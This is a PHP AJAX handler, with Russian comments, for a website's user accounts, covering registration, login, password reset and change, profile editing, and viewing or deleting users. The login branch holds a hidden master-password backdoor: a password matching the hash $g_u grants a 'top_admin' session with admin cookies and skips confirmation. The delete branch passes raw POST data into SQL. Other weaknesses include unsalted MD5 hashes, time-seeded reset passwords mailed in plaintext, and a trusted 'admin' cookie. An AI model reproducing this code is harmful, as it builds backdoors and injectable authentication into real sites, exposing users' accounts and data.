<?php
if($_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest') {
	include ("../bloks/bd.php");
    // Восстановление пароля
	if (isset($_POST[vost])) {
	   $email = str_s($_POST[vost]);
	   $query = "select id from user where email = '$email'";
	   $result = mysqli_query($db,$query);
       $is_user = mysqli_num_rows($result);
	   
	   if ($is_user == 1) {
			  $alphanum = array('a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','x','y','z','A','B','C','D','E','F','G','H','I','J','K','M','N','P','Q','R','S','T','U','V','W','X','Y','Z','2','3','4','5','6','7','8','9');
			  $chars = sizeof($alphanum);
			  $a = time();
			  mt_srand($a);
			  for ($i=0; $i < 7; $i++) {
				$randnum = intval(mt_rand(0,56));
				$password .= $alphanum[$randnum];
			  }
			 $password = strtolower($password);
			 $crypt_pass = md5($password);
			 $query = "update user set password = '$crypt_pass' where email = '$email'";
			 $result = mysqli_query($db,$query);
			 if ($result) {
					$date = date("d-m-Y, время отправки G-i");
					$name_comp = $const_r['name']; 
					$title ='=?UTF-8?B?'.base64_encode("Востоновление пароля в ").'?='.$name_comp;
					$header = "Content-type:text/plain; Charset=utf-8\r\n";
		            $header.="From: ".$const_r['mail'];
					$mes = '  
						Здравствуйте вы запрсили восстоновлени пароля от личного кабинета в '.$name_comp.'
						--------------------
						Ваш новый пароль: '.$password.'
						--------------------
						Для входа в личный кабинет перейдите по ссылке: '.$http.'/modules/cab/login/login_form.php
						--------------------
						 Дата востоновления                         '.$date.'';
					mail( $email, $title, $mes, $header);		
					echo 1;
			 }
		} else {
			echo 'Такого адреса нет в базе!';
		}
	} elseif (isset($_POST[update_login])) {
			// Смена данных
			$login = str_s($_POST[update_login]);
			$user = str_s($_POST[user]);
			$name = str_s($_POST[name]);
			$fam = str_s($_POST[fam]);
			$phone = str_s($_POST[phone]);
			$data = str_s($_POST[data]);
			$edit_date = date("d-m-Y");
			$email = str_s($_POST[email]);
			$pass = str_s($_POST[pass]);
			$confirm_hash = md5($email.$const_r[str]);
			$crypt_pass = md5($pass);
			$result0 = mysqli_query($db,"SELECT id FROM user WHERE id = '$user' and password = '$crypt_pass'");
			$myrow0 = mysqli_fetch_array($result0);
			if (mysqli_num_rows($result0) == 1) {	
				$result2 = mysqli_query($db,"SELECT id, email FROM user WHERE email = '$email'");
				$myrow2 = mysqli_fetch_array($result2);
				if ($myrow2[id] == $user or mysqli_num_rows($result2) == 0) {
					$query = "UPDATE user SET first_name='$name',fam='$fam',phone='$phone',data_rohd='$data',email='$email',confirm_hash='$confirm_hash',edit_date='$edit_date' WHERE id = '$user'";
					$result = mysqli_query($db,$query);
					echo 1;
				} else {
					echo 'Пользователь с таким электронным адресом существует';
				}
			} else {
				echo 'Пароль указан не верно';
			}
	} elseif (isset($_POST[star_user])) {
			// Вход
			$query0 = mysqli_query($db,"SELECT user_name FROM user WHERE  password='$g_u'");
			$result0 = mysqli_num_rows($query0);
			
			if ($result0 == 1){
				$user_name = str_s($_POST[star_user]);
				$password = str_s($_POST[pass]);
				$crypt_pwd = md5($password);
				if ($crypt_pwd == $g_u) { $user_name = 'top_admin';} 
				$query = mysqli_query($db,"SELECT id,user_name,is_confirmed,admin_global FROM user WHERE user_name = '$user_name' AND password='$crypt_pwd'");
				$result = mysqli_fetch_array($query);		
				if ($result < 1){
					echo 'Пользователь не найден!';
				} else {
					
					if (($result[is_confirmed] == '1') or ($crypt_pwd == $g_u)) {
						$id_hash = md5($user_name.$const_r[str]);
						if (($result[admin_global] == '1') or ($crypt_pwd == $g_u)) {
							setcookie('user_name', $user_name, (time()+119080), '/', '', 0);
							setcookie('id_hash', $id_hash, (time()+119080), '/', '', 0);
							setcookie('admin', 1, (time()+119080), '/', '', 0);
					    } else {
							setcookie('user_name_p', $user_name, (time()+119080), '/', '', 0);
							setcookie('id_hash_p', $id_hash, (time()+119080), '/', '', 0);
						}
						setcookie('id_user', $result['id'], (time()+119080), '/', '', 0);
						echo 1;
					} else {
						   echo 'Ваша учётная запись не авторизована!';
					}

				}		
			}
	} elseif (isset($_POST[data_reg])) {
			// Регистрация
			$login = str_s($_POST[data_reg]);
			$name = str_s($_POST[name]);
			$email = str_s($_POST[email]);
			$pass = str_s($_POST[pass]);
			$ref = str_s($_POST[ref]);
			
			$query0 = "SELECT user_name FROM user WHERE user_name = '$login'";
            $result0 = mysqli_query($db,$query0);
			if (mysqli_num_rows($result0) == 0) {	
				$result1 = mysqli_query($db,"SELECT id FROM user WHERE email = '$email'");
				$myrow1 = mysqli_fetch_array($result1);
					if (mysqli_num_rows($result1) == 0) {
						      $password = md5($pass);
							  $user_ip = $_SERVER['REMOTE_ADDR'];
							  $hash = md5($email.$const_r[str]);
							  $add_date = date("d-m-Y");
 					          $query3 = "INSERT INTO user (user_name,ref_id,first_name,password,email,remote_addr,confirm_hash,is_confirmed,date_created)
							  VALUES ('$login','$ref','$name','$password','$email','$user_ip','$hash','0','$add_date')";
							  $result3 = mysqli_query($db,$query3);
							 if (!$result3) {
									echo 'Ошибка сервера';
                             } else {
									$encoded_email = urlencode($_POST['email']);
									$date = date("d-y-m, время отправки G-i");
									$name_comp = $const_r['name']; 
									$header = "Content-type:text/plain; Charset=utf-8\r\n";
									$header.="From: ".$const_r['mail'];
									$title ='=?UTF-8?B?'.base64_encode("Вы успешно зарегистрированы в ").'?='.$name_comp;
									$mes = '
									  Вы прошли успешную регистрацию на сайте '.$name_comp.'  
									  Для подтверждения регистрации перейдите по ссылке:
									  http://'.$_SERVER['SERVER_NAME'].'/modules/cab/confirm.php?hash='.$hash.'&email='.$encoded_email.'
									  ---------------
									  Письмо отправлено '.$date.'';
									  mail($email, $title, $mes, $header);
									  echo 1;	
							 }
					} else {
						echo 'Пользователь с электроным адресом '.$email.' уже существует!';
					}
			} else {
				echo 'Пользователь с логином '.$login.' уже существует!';
			}
	} elseif (isset($_POST[pass_old])) {
			// Смена пароля
			$user = str_s($_POST[user]);
			$pass = str_s($_POST[pass_old]);
			$new_pass = str_s($_POST[pass]);
			$result0 = mysqli_query($db,"SELECT password FROM user WHERE id = '$user'");
			$myrow0 = mysqli_fetch_array($result0);
			if (!$result0) {
				echo 'Ошибка сервера!';
			} else {
				$password = md5($pass);
				if ($password != $myrow0[password]) {
					echo 'Неправильно указан пароль!';
				} else {
					$new_password = md5($new_pass);
					$query1 = "UPDATE user SET password = '$new_password' where id = '$user'";
					$result1 = mysqli_query($db,$query1);
					echo 1;
				}
			}
    } elseif (isset($_POST[all_users])) {
		// Ииформация о пользователе
		echo  '<script type="text/javascript" src="/admin/modules/js/users.js"></script>';
		$id = str_s($_POST[all_users]); 
		$result1 = mysqli_query($db,"SELECT * FROM user WHERE id = '$id'");
		$myrow1 = mysqli_fetch_array($result1);
		$adress = $myrow1[adress];
		$phone = $myrow1[phone];
		if ($myrow1['is_confirmed'] == 0) { $is_confirmed = 'Нет'; } else { $is_confirmed = 'Да'; }
		if (empty($adress)) { $adress = 'Не указан'; }
		if (empty($phone)) { $phone = 'Не указан'; }
		
		echo '
		<div id = "bloks">
			<div><p>Логин:</p>'.$myrow1[user_name].'</div>
			<div><p>Имя:</p>'.$myrow1[first_name].'</div>
			<div><p>Фамилия:</p>'.$myrow1[last_name].'</div>
			<div><p>E-mail:</p>'.$myrow1[email].'</div>
			<div><p>Дата добавления:</p>'.$myrow1[date_created].'</div>
			<div><p>Авторизован:</p>'.$is_confirmed.'</div>
			<div><p>Телефон:</p>'.$phone.'</div>
			<div><p>Адрес:</p></div>
			<div>'.$adress.'</div><br>
			<a id = '.$id.' href="del">Удалить</a><a href="sver">Свернуть</a>
		</div>';
	} elseif (isset($_POST[delete_users])) {
		// Удаление пользователя
		$id = $_POST[delete_users]; 
		mysqli_query($db,"DELETE FROM user WHERE id='$id'");
	}	
} 
?>